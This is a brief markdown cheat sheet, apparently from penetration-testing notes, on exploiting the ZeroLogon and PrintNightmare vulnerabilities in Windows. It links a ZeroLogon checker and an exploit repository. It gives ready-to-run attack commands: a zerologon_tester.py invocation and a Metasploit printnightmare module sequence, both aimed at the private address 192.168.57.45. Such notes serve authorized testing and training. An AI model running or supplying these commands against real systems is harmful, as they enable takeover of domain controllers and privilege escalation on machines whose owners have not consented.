
- ZeroLogon Checker
	- https://github.com/SecuraBV/CVE-2020-1472
- Exploit
	- https://github.com/dirkjanm/CVE-2020-1472

* **Abusing ZeroLogon**: Exploit ZeroLogon vulnerability.
	- Exploit ZeroLogon vulnerability.
		```bash
		zerologon_tester.py -i 192.168.57.45
		```
* **PrintNightmare (CVE-2021-1675) Walkthrough**: Exploit PrintNightmare vulnerability.
	- Exploit PrintNightmare vulnerability.
		```bash
		msfconsole
		use exploit/windows/local/printnightmare
		set RHOSTS 192.168.57.45
		```

